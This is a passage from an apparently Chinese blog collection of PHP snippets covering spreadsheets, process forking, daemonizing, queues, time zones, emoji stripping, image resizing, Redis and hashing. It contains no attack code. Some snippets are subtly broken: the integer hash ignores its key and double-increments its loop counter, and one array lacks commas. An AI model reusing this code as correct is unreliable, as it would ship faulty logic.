*/</span></span><br><span class="line"><span class="keyword">if</span> ($uri !== <span class="string">"/"</span> &amp;&amp; file_exists(__DIR__ . <span class="string">"$uri"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 加载入口文件</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">require_once <span class="string">"./index.php"</span>;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/28768#reply94663</span></span><br></pre></td></tr></table></figure>
<h3 id="phpexcel"><a href="#phpexcel" class="headerlink" title="phpexcel"></a>phpexcel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/PHPOffice/PhpSpreadsheet</span></span><br><span class="line"></span><br><span class="line">composer <span class="built_in">require</span> phpoffice/phpspreadsheet</span><br><span class="line"><span class="built_in">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">use PhpOffice\PhpSpreadsheet\Spreadsheet;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Writer\Xlsx;</span><br><span class="line"></span><br><span class="line">$spreadsheet = <span class="keyword">new</span> Spreadsheet();</span><br><span class="line">$sheet = $spreadsheet-&gt;getActiveSheet();</span><br><span class="line">$sheet-&gt;setCellValue(<span class="string">'A1'</span>, <span class="string">'Hello World !'</span>);</span><br><span class="line"></span><br><span class="line">$writer = <span class="keyword">new</span> Xlsx($spreadsheet);</span><br><span class="line">$writer-&gt;save(<span class="string">'hello world.xlsx'</span>);</span><br><span class="line">php -S localhost:<span class="number">8000</span> -t vendor/phpoffice/phpspreadsheet/samples</span><br><span class="line"><span class="comment">// 文件路径</span></span><br><span class="line">$inputFileName = <span class="string">'./sampleData/example1.xls'</span>;</span><br><span class="line"></span><br><span class="line">$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);</span><br><span class="line">$reader = <span class="keyword">new</span> \PhpOffice\PhpSpreadsheet\Reader\Xls();</span><br><span class="line">只要读取数据，不要格式时，实例读取器中 readDataOnly 属性，如下</span><br><span class="line"></span><br><span class="line">$inputFileType = <span class="string">'Xls'</span>;</span><br><span class="line">$inputFileName = <span class="string">'./sampleData/example1.xls'</span>;</span><br><span class="line"></span><br><span class="line">$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);</span><br><span class="line"><span class="comment">/**  只要数据  **/</span></span><br><span class="line">$reader-&gt;setReadDataOnly(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$spreadsheet = $reader-&gt;load($inputFileName);</span><br><span class="line"></span><br><span class="line">多个文件合并为一个对象</span><br><span class="line"></span><br><span class="line">$inputFileType = <span class="string">'Csv'</span>;</span><br><span class="line">$inputFileNames = [</span><br><span class="line">    <span class="string">'./sampleData/example1.csv'</span>,</span><br><span class="line">    <span class="string">'./sampleData/example2.csv'</span></span><br><span class="line">    <span class="string">'./sampleData/example3.csv'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 拿到第一个  **/</span></span><br><span class="line">$inputFileName = array_shift($inputFileNames);</span><br><span class="line"></span><br><span class="line">$spreadsheet = $reader-&gt;load($inputFileName);</span><br><span class="line"></span><br><span class="line">$spreadsheet-&gt;getActiveSheet()</span><br><span class="line">    -&gt;setTitle(pathinfo($inputFileName,PATHINFO_BASENAME));</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  循环读取  **/</span></span><br><span class="line">foreach($inputFileNames <span class="keyword">as</span> $sheet =&gt; $inputFileName) &#123;</span><br><span class="line">    <span class="comment">/**  重新设置工作表索引  **/</span></span><br><span class="line">    $reader-&gt;setSheetIndex($sheet+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/**  把文件当做一个新的工作表载入  **/</span></span><br><span class="line">    $reader-&gt;loadIntoExisting($inputFileName,$spreadsheet);</span><br><span class="line">    <span class="comment">/**  设置工作表标题  **/</span></span><br><span class="line">    $spreadsheet-&gt;getActiveSheet()</span><br><span class="line">        -&gt;setTitle(pathinfo($inputFileName,PATHINFO_BASENAME));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$spreadsheet = PhpOffice\PhpSpreadsheet\IOFactory::load(<span class="string">"new.xls"</span>);</span><br><span class="line"></span><br><span class="line">$data = $spreadsheet</span><br><span class="line">            -&gt;getSheet(<span class="number">0</span>) <span class="comment">// 指定第一个工作表为当前</span></span><br><span class="line">            -&gt;toArray();  <span class="comment">// 转为数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者得到全部工作表的数据数组           </span></span><br><span class="line">$cells=array();</span><br><span class="line"><span class="comment">// 工作表对象有迭代器实现</span></span><br><span class="line">foreach ( $spreadsheet-&gt;getWorksheetIterator() <span class="keyword">as</span> $data ) &#123;</span><br><span class="line">    $cells = $data-&gt;toArray();</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30048</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-多进程"><a href="#PHP-多进程" class="headerlink" title="PHP 多进程"></a>PHP 多进程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$processNum = <span class="number">4</span>;</span><br><span class="line">$timeStart = time();</span><br><span class="line">$tasks = range(<span class="number">1</span>, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">$jobs = [];</span><br><span class="line">foreach ($tasks <span class="keyword">as</span> $task) &#123;</span><br><span class="line">    <span class="comment">//这里讲返回的结果对4进行取模，存入4个数组，然后4个进程分别读取不同的数据进行处理</span></span><br><span class="line">    $jobs[$task % $processNum][] = $task;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mainPid = posix_getpid();</span><br><span class="line">echo <span class="string">"主进程："</span> . $mainPid . PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $processNum; $i++) &#123;</span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">//错误处理：创建子进程失败时返回-1.</span></span><br><span class="line">        die(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125; elseif ($pid) &#123;</span><br><span class="line">        <span class="comment">//父进程会得到子进程号，所以这里是父进程执行的逻辑</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 子进程得到的$pid为0, 所以这里是子进程执行的逻辑。</span></span><br><span class="line">        $content = $jobs[$i];</span><br><span class="line">        $childStart = time();</span><br><span class="line">        foreach ($content <span class="keyword">as</span> $v2) &#123;</span><br><span class="line">            sleep(<span class="number">1</span>); <span class="comment">// 子进程执行的逻辑</span></span><br><span class="line">        &#125;</span><br><span class="line">        $childEnd = time();</span><br><span class="line">        $childDiff = $childEnd - $childStart;</span><br><span class="line">        echo <span class="string">"#"</span> . posix_getpid() . <span class="string">"执行完毕，用时："</span> . $childDiff . <span class="string">"秒"</span> . PHP_EOL;</span><br><span class="line">        exit(); <span class="comment">// 子进程执行完后必须退出，否则会循环的创建进程...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里挂起主进程，等待子进程全部退出后再退出主进程</span></span><br><span class="line"><span class="keyword">while</span> ($processNum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( pcntl_wait($status) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $processNum--;</span><br><span class="line">        echo <span class="string">"#"</span> . $pid . <span class="string">"退出"</span> . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$timeEnd = time();</span><br><span class="line">$diff = $timeEnd - $timeStart;</span><br><span class="line">echo <span class="string">'共计用时：'</span> . $diff . <span class="string">'秒'</span>;https:<span class="comment">//learnku.com/laravel/t/30134</span></span><br></pre></td></tr></table></figure>
<h3 id="php-进程"><a href="#php-进程" class="headerlink" title="php 进程"></a>php 进程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">后台运行</span><br><span class="line"><span class="keyword">if</span> ($pid=pcntl_fork ()) exit (<span class="number">0</span>);<span class="comment">// 是父进程，结束父进程，子进程继续</span></span><br><span class="line">脱离控制终端，登录会话和进程组</span><br><span class="line">posix_setsid ();<span class="comment">// 子进程升级组长进程，脱离原来的会话 / 终端</span></span><br><span class="line">禁止进程重新打开控制终端</span><br><span class="line"><span class="keyword">if</span> ($pid=pcntl_fork ()) exit (<span class="number">0</span>);<span class="comment">// 结束第一子进程，第二子进程继续（第二子进程不再是会话组长）</span></span><br><span class="line">关闭打开的文件描述符</span><br><span class="line">fclose (STDIN),fclose (STDOUT),fclose (STDERR)<span class="comment">// 关闭标准输入输出与错误显示。</span></span><br><span class="line">改变当前工作目录</span><br><span class="line">chdir(<span class="string">"/"</span>)</span><br><span class="line">重设文件创建掩模</span><br><span class="line">umask (<span class="number">0</span>);<span class="comment">// 防止继承父级遗留下来的掩模</span></span><br></pre></td></tr></table></figure>
<h3 id="码模拟实现队列"><a href="#码模拟实现队列" class="headerlink" title="码模拟实现队列"></a>码模拟实现队列</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'MAXSIZE'</span>,<span class="number">5</span>);<span class="comment">//队列空间大小</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param $queue 队列存储空间</span></span><br><span class="line"><span class="comment"> * @param $front 队列队头游标</span></span><br><span class="line"><span class="comment"> * @param $near  队列队尾游标</span></span><br><span class="line"><span class="comment"> * @param $data  进队的数据</span></span><br><span class="line"><span class="comment"> * @return int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enQueue</span>(<span class="params">&amp;$queue,$front,$near,$data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (($near+<span class="number">1</span>)%MAXSIZE==$front)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"队空间已满"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $queue[$near%MAXSIZE] = $data;</span><br><span class="line">    $near+=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> $near;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 出队操作</span></span><br><span class="line"><span class="comment"> * @param $queue</span></span><br><span class="line"><span class="comment"> * @param $front</span></span><br><span class="line"><span class="comment"> * @param $near</span></span><br><span class="line"><span class="comment"> * @return int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deQueue</span>(<span class="params">&amp;$queue,$front,$near</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($front==$near%MAXSIZE)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"空队列"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data = $queue[$front];</span><br><span class="line">    echo <span class="string">"出队元素："</span>.$data.PHP_EOL;</span><br><span class="line">    $front = ($front+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">    <span class="keyword">return</span> $front;</span><br><span class="line">&#125;</span><br><span class="line">$a = [];<span class="comment">//队列 使用数组模拟</span></span><br><span class="line">$front = $near = <span class="number">0</span>;<span class="comment">//游标初始化</span></span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">1</span>);</span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">2</span>);</span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line"><span class="comment">//$front = deQueue($a,$front,$near);</span></span><br><span class="line"></span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">100</span>);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line"></span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">1</span>);</span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">2</span>);</span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">3</span>);</span><br><span class="line">$near = enQueue($a,$front,$near,<span class="number">4</span>);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">$front = deQueue($a,$front,$near);</span><br><span class="line">队列实现了先进先出 FIFO 的功能，在许多应用中如队列系统，排队买票等都应用到了，比如我们用的 redis 缓存系统中的列数据类型 List，它便能完成队列的功能</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30430</span></span><br></pre></td></tr></table></figure>
<h3 id="夏令时"><a href="#夏令时" class="headerlink" title="夏令时"></a>夏令时</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断美国那个时间段是否为夏令时</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_dst</span>(<span class="params">$timestamp</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $timezone = date(<span class="string">'e'</span>); <span class="comment">//获取当前使用的时区</span></span><br><span class="line">    date_default_timezone_set(<span class="string">'US/Pacific-New'</span>); <span class="comment">//强制设置时区</span></span><br><span class="line">    $dst = date(<span class="string">'I'</span>,$timestamp); <span class="comment">//判断是否夏令时</span></span><br><span class="line">    date_default_timezone_set($timezone); <span class="comment">//还原时区</span></span><br><span class="line">    <span class="keyword">return</span> $dst; <span class="comment">//返回结果</span></span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//gist.github.com/flowerains/6694812</span></span><br><span class="line"><span class="comment">//获取当月第一天和最后一天</span></span><br><span class="line">  private <span class="function"><span class="keyword">function</span> <span class="title">getthemonth</span>(<span class="params">$date</span>) </span></span><br><span class="line"><span class="function">	</span>&#123; </span><br><span class="line">		$firstday = date(<span class="string">'Y-m-01'</span>, strtotime($date)); </span><br><span class="line">		$lastday = date(<span class="string">'Y-m-d'</span>, strtotime(<span class="string">"$firstday +1 month -1 day"</span>)); </span><br><span class="line">		<span class="keyword">return</span> array($firstday, $lastday); </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="去除emoji"><a href="#去除emoji" class="headerlink" title="去除emoji"></a>去除emoji</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeEmoji</span>(<span class="params">$text</span>) </span>&#123;</span><br><span class="line">    $clean_text = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// Match Emoticons</span></span><br><span class="line">    $regexEmoticons = <span class="string">'/[\x&#123;1F600&#125;-\x&#123;1F64F&#125;]/u'</span>;</span><br><span class="line">    $clean_text = preg_replace($regexEmoticons, <span class="string">''</span>, $text);</span><br><span class="line">    <span class="comment">// Match Miscellaneous Symbols and Pictographs</span></span><br><span class="line">    $regexSymbols = <span class="string">'/[\x&#123;1F300&#125;-\x&#123;1F5FF&#125;]/u'</span>;</span><br><span class="line">    $clean_text = preg_replace($regexSymbols, <span class="string">''</span>, $clean_text);</span><br><span class="line">    <span class="comment">// Match Transport And Map Symbols</span></span><br><span class="line">    $regexTransport = <span class="string">'/[\x&#123;1F680&#125;-\x&#123;1F6FF&#125;]/u'</span>;</span><br><span class="line">    $clean_text = preg_replace($regexTransport, <span class="string">''</span>, $clean_text);</span><br><span class="line">    <span class="keyword">return</span> $clean_text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="imagick等比缩放图片"><a href="#imagick等比缩放图片" class="headerlink" title="imagick等比缩放图片"></a>imagick等比缩放图片</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 使用imagick 等比缩放图片 </span></span><br><span class="line"><span class="comment">     * @param string $source_img  源图片地址 </span></span><br><span class="line"><span class="comment">     * @param string $target_img  缩放后图片地址 </span></span><br><span class="line"><span class="comment">     * @param int $with   缩放后图片宽度 </span></span><br><span class="line"><span class="comment">     * @param int $height  缩放后图片高度 </span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">imagick</span>(<span class="params">$source_img,$target_img,$with,$height</span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(is_file($source_img))&#123; <span class="comment">//判断源图片是否存在 </span></span><br><span class="line">            $im = <span class="keyword">new</span> Imagick(); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            exit; </span><br><span class="line">        &#125; </span><br><span class="line">        $result = $im-&gt;readImage($source_img);  </span><br><span class="line">        $srcWH = $im-&gt;getImageGeometry(); <span class="comment">//获取源图片宽和高 </span></span><br><span class="line">        <span class="comment">//图片等比例缩放宽和高设置 ，根据宽度设置等比缩放 </span></span><br><span class="line">        <span class="keyword">if</span>($srcWH[<span class="string">'width'</span>]&gt;$<span class="keyword">with</span>)&#123; </span><br><span class="line">            $srcW[<span class="string">'width'</span>] = $<span class="keyword">with</span>; </span><br><span class="line">            $srcH[<span class="string">'height'</span>] = $srcW[<span class="string">'width'</span>]/$srcWH[<span class="string">'width'</span>]*$srcWH[<span class="string">'height'</span>]; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            $srcW[<span class="string">'width'</span>] = $srcWH[<span class="string">'width'</span>]; </span><br><span class="line">            $srcH[<span class="string">'height'</span>] = $srcWH[<span class="string">'height'</span>]; </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">        <span class="comment">//按照比例进行缩放 </span></span><br><span class="line">        $im-&gt;thumbnailImage( $srcW[<span class="string">'width'</span>], $srcH[<span class="string">'height'</span>], <span class="literal">true</span> );  </span><br><span class="line">         </span><br><span class="line">        <span class="comment">// 按照缩略图大小创建一个有颜色的图片 </span></span><br><span class="line">        $new_img= <span class="keyword">new</span> Imagick(); </span><br><span class="line">        $new_img-&gt;newImage( $srcW[<span class="string">'width'</span>], $srcH[<span class="string">'height'</span>], <span class="string">'white'</span>, <span class="string">'jpg'</span> ); <span class="comment">//pink,black </span></span><br><span class="line">         </span><br><span class="line">        <span class="comment">//合并图片 </span></span><br><span class="line">        $new_img-&gt;compositeImage( $im, <span class="attr">imagick</span>::COMPOSITE_OVER, <span class="number">0</span>, <span class="number">0</span>);  </span><br><span class="line">        <span class="comment">//生成图片 </span></span><br><span class="line">        $new_img-&gt;setImageFileName($target_img); </span><br><span class="line">        $new_img-&gt;writeImage(); </span><br><span class="line">        <span class="comment">//输出图片 </span></span><br><span class="line">        header( <span class="string">"Content-Type: image/jpg"</span> ); </span><br><span class="line">        echo $new_img; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">https:<span class="comment">//gist.github.com/flowerains/beaab90b1bfc01054de3</span></span><br></pre></td></tr></table></figure>
<h3 id="redis支持php的序列化和反序列化"><a href="#redis支持php的序列化和反序列化" class="headerlink" title="redis支持php的序列化和反序列化"></a>redis支持php的序列化和反序列化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>, <span class="number">1</span>);</span><br><span class="line">$redis-&gt;setOption(Redis::OPT_SERIALIZER, <span class="attr">Redis</span>::SERIALIZER_PHP);</span><br><span class="line">$key = <span class="string">'this_is_test'</span>;</span><br><span class="line">$value = [<span class="string">'15'</span>,<span class="string">'12'</span>,<span class="number">15</span>,<span class="string">'alex'</span>];</span><br><span class="line">$name = $redis-&gt;rPush($key,$value);</span><br><span class="line">$result = $redis-&gt;lpop($key);</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure>
<h3 id="一致性hash"><a href="#一致性hash" class="headerlink" title="一致性hash"></a>一致性hash</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 整数hash</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">intHash</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $md5 = substr(md5($key), <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">    $seed = <span class="number">31</span>;</span><br><span class="line">    $hash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; <span class="number">8</span>; ++$i) &#123;</span><br><span class="line">        $hash = $hash * $seed + ord(md5($i));</span><br><span class="line">        ++$i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash &amp; <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line">$value = intHash(<span class="string">'wangchuang'</span>) % <span class="number">2</span>;</span><br><span class="line">echo $value;</span><br></pre></td></tr></table></figure>
<h3 id="抽奖的经典算法"><a href="#抽奖的经典算法" class="headerlink" title="抽奖的经典算法"></a>抽奖的经典算法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 